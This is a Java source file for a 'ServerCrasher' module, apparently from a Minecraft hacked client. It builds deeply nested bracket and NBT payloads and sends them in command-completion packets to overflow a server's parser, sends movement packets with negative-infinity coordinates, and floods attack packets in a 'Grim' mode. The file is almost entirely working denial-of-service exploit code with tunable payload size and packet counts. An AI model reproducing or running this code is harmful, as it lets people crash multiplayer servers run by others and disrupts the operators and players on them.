package template.rip.deprecated;

import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import template.rip.api.event.events.TickEvent;
import template.rip.api.event.orbit.EventHandler;
import template.rip.api.object.Description;
import template.rip.module.Module;
import template.rip.module.setting.settings.BooleanSetting;
import template.rip.module.setting.settings.ModeSetting;
import template.rip.module.setting.settings.NumberSetting;
import template.rip.module.setting.settings.StringSetting;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class ServerCrasherModule extends Module {
    public enum modeEnum{Completion, CompletionNew, NegativeInfinity, Grim}
    public final ModeSetting<modeEnum> mode = new ModeSetting<>(this, modeEnum.Completion, "Mode");

    public final NumberSetting attackPackets = new NumberSetting(this, 3, 0, 80, 1, "Attack Packets");
    public final NumberSetting packets = new NumberSetting(this, 3, 0, 10, 1, "Packets");
    public final NumberSetting length = new NumberSetting(this, 0, 0, 5000, 1, "Length");
    public final BooleanSetting closePayload = new BooleanSetting(this, false, "Close Payload");
    public final BooleanSetting autoMode = new BooleanSetting(this, true, "Auto Mode");
    public final BooleanSetting sendCommand = new BooleanSetting(this, false, "Send Command");
    public final StringSetting msg = new StringSetting("/msg @a[nbt={PAYLOAD}]", this, "Message");

    public ServerCrasherModule(Category category, Description description, String name) {
        super(category, description, name);
    }
    @Override
    public String getSuffix() {
        return " "+mode.getDisplayName();
    }

    @Override
    public void onEnable() {
        if (mc.getNetworkHandler() == null) {
            setEnabled(false);
            return;
        }

        if (mode.is(modeEnum.Completion)) {
            String overflow = generateJsonObject(length.getIValue());
            if (closePayload.isEnabled()) overflow = generateClosedJsonObject(length.getIValue());

            String partialCommand = msg.getContent().replace("{PAYLOAD}", overflow);
            if (!autoMode.isEnabled()) {
                mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                setEnabled(false);
            }
            for (int i = 0; i < packets.getIValue(); i++) {
                mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
            }
            setEnabled(false);
        } else if (mode.is(modeEnum.CompletionNew)) {
            String overflow = generateNbt(length.getIValue());
            String partialCommand = msg.getContent().replace("{PAYLOAD}", overflow);
            if (!autoMode.isEnabled()) {
                if (sendCommand.isEnabled()) mc.getNetworkHandler().sendCommand(partialCommand);
                mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                setEnabled(false);
            }
            for (int i = 0; i < packets.getIValue(); i++) {
                if (sendCommand.isEnabled()) mc.getNetworkHandler().sendCommand(partialCommand);
                mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
            }
            setEnabled(false);
        } else if (mode.is(modeEnum.NegativeInfinity)) {
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY,
                    Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, mc.player.horizontalCollision));
            setEnabled(false);
        }
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (!nullCheck()) return;
        if (mode.is(modeEnum.Grim)) {
            Entity ent = mc.targetedEntity;
            if (ent != null && mc.interactionManager != null) {
                for (int i = 0; i < attackPackets.getIValue(); i++) {
                    mc.interactionManager.attackEntity(mc.player, ent);
                }
            }
        }
    }

    private String generateNbt(int levels) {
        String s = IntStream.range(0, levels).mapToObj(a -> "[B;")
                .collect(Collectors.joining());
        return "minecraft:tell @a[nbt={C:"+s;
    }

    private String generateJsonObject(int levels) {
        String s = IntStream.range(0, levels).mapToObj(a -> "[")
            .collect(Collectors.joining());
        return "{a:"+s+"}";
    }

    private String generateClosedJsonObject(int levels) {
        String s = IntStream.range(0, levels).mapToObj(a -> "[")
                .collect(Collectors.joining());
        String s2 = IntStream.range(0, levels).mapToObj(a -> "]")
                .collect(Collectors.joining());
        return "{a:"+s+s2+"}";
    }

}
